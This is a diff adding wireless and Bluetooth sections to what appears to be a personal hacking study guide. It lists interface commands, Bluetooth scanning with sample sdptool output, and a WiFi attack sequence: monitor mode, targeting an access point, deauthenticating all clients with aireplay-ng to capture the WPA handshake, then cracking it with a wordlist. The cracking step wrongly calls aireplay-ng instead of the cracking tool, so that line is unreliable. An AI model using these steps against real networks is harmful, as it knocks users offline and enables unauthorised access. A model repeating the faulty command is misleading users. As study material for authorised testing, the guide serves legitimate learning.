@@ -714,4 +714,105 @@ All depends on how good your proxies are.
 Self-explanatory. Buy the good VPN you can afford (ProtonVPN) and try to use ProtonMail. A VPN that offers proper tunneling and actively fights the bad-laws is your go-to VPN.
 
 #### **20) WIRELESS NETWORKS**
-Understanding and Inspecting them. 
+Understanding and Inspecting them.
+A few terms : AP, ESSID (extended), BSSID (base), SSID (Service Set ID-fier), Channels (1-14), Power, Security (WEP - Wired Equivalent Privacy, WPA  - Wifi Protected Access), Modes (managed, master or monitor), Range (100m), Frequency (2.4 & 5Ghz).
+
+**Commands**
+`$ > ifconfig` for everything and `$ > iwconfig` for wireless stuff only. iwconfig helps you see the terms that are mentioned above. 
+You can use `$ > iwlist` command to see the possible AP's you can connect to -- followed by the interface & the action. 
+`$ > iwlist wlan0 scan`  -- will include all possible APs and their key details. 
+Another one is Network-Manager Command Line Interface or nmcli -- it's the daemon that 
+provides high-level interface for the N/w interfaces. It avoids the GUI stuff.
+`$ > nmcli dev wifi`  -- will show a detailed dump including SSIDs, MODE, CHAN, RATE etc. You can use this command to even connect to any AP.
+`$ > nmcli dev wifi connect MyWifiName password 12345678`
+Remember, after connecting to a wifi network, the result of iwconfig will obviously change. 
+
+**Wi-Fi Recon with *aircrack-ng***
+Put your after-market WiFi adapter in monitor mode via (considering the wifi adapter is indeed `wlan0`) : 
+`$ > airmon-ng start wlan0`  -- this will be followed by a renaming of your adapter to 'wlan0mon'. Remember, to stop all this tom-foolery, use `$ > airmon-ng stop wlan0`.
+
+Now we need to 
+`$ > airodump-ng wlan0mon`  -- to get a dump of all the APs. Pick a target and proceed (example) :
+`$ > airodump-ng  -c 10  --bssid 01:01:AA:BB:CC:22  -w WifiNamePSK  wlan0mon`
+In another terminal, use `$ > aireplay-ng` to de-auth/kick everyone, then capture the handshake packets as they log in again. Example : 
+`$ > aireplay-ng --deauth 100 -a 01:01:AA:BB:CC:22 -c A0:A3:E2:44:7C:E5  wlan0mon`
+Then
+`$ > aireplay-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 WifiNamePSK.cap`
+
+**Detecting & Connecting to Bluetooth**
+BlueZ daemon is responsible for BT connections on Linux. 
+It has a few tools that can be used. 
+`hciconfig`  -- same as iwconfig - to see the BT interface and query the devices for specs.
+`hcitool`  -- provides us with Device Name, ID, Class, Clock info etc.
+`hcidump`  -- sniff BT comms - to capture data sent over BT signal.
+First, check if BlueZ and interface exists or not. Look for **`hci0`**
+`$ > hciconfig`
+If valid, then 
+`$ > sudo hciconfig hci0 up`
+Then try
+`$ > hcitool inq`  and `$ > hcitool scan`
+`inq` - will show more devices with their class and clock offset which can be important for recon.
+`scan` - might not show all devices.
+You can fetch the name of the device -- by using 'inq' to get the BT MAC Addr and passing that on to the '**name**' command of hcitool
+`$ > hcitool name MAC_ADDR_HERE`  -- will reveal the name of the device in most cases.
+(https://www.bluetooth.com/wp-content/uploads/Files/Specification/HTML/Assigned_Numbers/out/en/Assigned_Numbers.pdf)
+
+**Scanning for Services with sdptool**
+Service Discovery Protocol. Does not require the device to be in discovery mode to be scanned. 
+`$ > sdptool browse MAC_ADDR`
+Sample output :
+`Browsing C4:DF:39:38:22:60 ...`
+`Service RecHandle: 0x10000`
+`Service Class ID List:`
+  `"Generic Attribute" (0x1801)`
+`Protocol Descriptor List:`
+  `"L2CAP" (0x0100)`
+    `PSM: 31`
+  `"ATT" (0x0007)`
+    `uint16: 0x0001`
+    `uint16: 0x0009`
+
+`Service RecHandle: 0x10001`
+`Service Class ID List:`
+  `"Generic Access" (0x1800)`
+`Protocol Descriptor List:`
+  `"L2CAP" (0x0100)`
+    `PSM: 31`
+  `"ATT" (0x0007)`
+    `uint16: 0x0014`
+    `uint16: 0x001a`
+
+`Service Name: Advanced Audio Source`
+`Service RecHandle: 0x10003`
+`Service Class ID List:`
+  `"Audio Source" (0x110a)`
+`Protocol Descriptor List:`
+  `"L2CAP" (0x0100)`
+    `PSM: 25`
+  `"AVDTP" (0x0019)`
+    `uint16: 0x0103`
+`Profile Descriptor List:`
+  `"Advanced Audio" (0x110d)`
+    `Version: 0x0103`
+
+`Service RecHandle: 0x10004`
+`Service Class ID List:`
+  `"AV Remote" (0x110e)`
+`Protocol Descriptor List:`
+  `"L2CAP" (0x0100)`
+    `PSM: 23`
+  `"AVCTP" (0x0017)`
+    `uint16: 0x0102`
+`Profile Descriptor List:`
+  `"AV Remote" (0x110e)`
+    `Version: 0x0103`
+
+**Devices reachable with l2ping**
+Similar method :
+`$ > l2ping MAC_ADDR`
+Sees if the host is reachable or not. Kinda like the normal ping command. 
+Example : `$ > sudo l2ping C4:DF:39:38:22:60 -c 4`
+Confirms the status. Now if reachable, go ahead and attack.
+
+#### **21) UNDERSTANDING KERNEL MODULES**
+Both native and loadable kernel modules.
